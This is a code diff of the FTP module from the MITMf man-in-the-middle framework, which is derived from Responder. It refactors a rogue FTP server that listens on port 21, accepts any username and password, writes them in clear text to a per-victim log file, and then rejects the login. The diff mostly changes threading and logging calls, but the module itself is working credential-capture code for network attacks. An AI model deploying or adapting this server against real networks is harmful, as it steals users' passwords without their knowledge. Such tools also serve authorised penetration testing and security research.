@@ -1,25 +1,25 @@
-##################################################################################
-#FTP Stuff starts here
-##################################################################################
+import socket
+import threading
+import logging
+
+from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
+from core.responder.packet import Packet
+from core.responder.odict import OrderedDict
+from core.responder.common import *
+
+mitmf_logger = logging.getLogger("mitmf")
 
 class FTPServer():
-
-	def serve_thread_tcp(host, port, handler):
+	
+	def start(self):
 		try:
-			server = ThreadingTCPServer((host, port), handler)
-			server.serve_forever()
-		except Exception, e:
-			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))
-
-	#Function name self-explanatory
-	def start(FTP_On_Off):
-		if FTP_On_Off == "ON":
-			t = threading.Thread(name="FTP", target=self.serve_thread_tcp, args=("0.0.0.0", 21, FTP))
+			mitmf_logger.debug("[FTPServer] online")
+			server = ThreadingTCPServer(("0.0.0.0", 21), FTP)
+			t = threading.Thread(name="FTPServer", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
-
-		if FTP_On_Off == "OFF":
-			return False
+		except Exception, e:
+			mitmf_logger.error("[FTPServer] Error starting on port {}: {}".format(21, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -45,8 +45,7 @@ class FTP(BaseRequestHandler):
 			data = self.request.recv(1024)
 			if data[0:4] == "USER":
 				User = data[5:].replace("\r\n","")
-				#print "[+]FTP User: ", User
-				responder_logger.info('[+]FTP User: %s'%(User))
+				mitmf_logger.info('[FTPServer] {} FTP User: {}'.format(self.client_address[0], User))
 				t = FTPPacket(Code="331",Message="User name okay, need password.")
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -54,8 +53,7 @@ class FTP(BaseRequestHandler):
 				Pass = data[5:].replace("\r\n","")
 				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
-				#print "[+]FTP Password is: ", Pass
-				responder_logger.info('[+]FTP Password is: %s'%(Pass))
+				mitmf_logger.info('[FTPServer] {} FTP Password is: {}'.format(self.client_address[0], Pass))
 				t = FTPPacket(Code="530",Message="User not logged in.")
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -63,9 +61,5 @@ class FTP(BaseRequestHandler):
 				t = FTPPacket(Code="502",Message="Command not implemented.")
 				self.request.send(str(t))
 				data = self.request.recv(1024)
-		except Exception:
-			pass
-
-##################################################################################
-#FTP Stuff ends here
-##################################################################################
+		except Exception as e:
+			mitmf_logger.error("[FTPServer] Error handling request: {}".format(e))
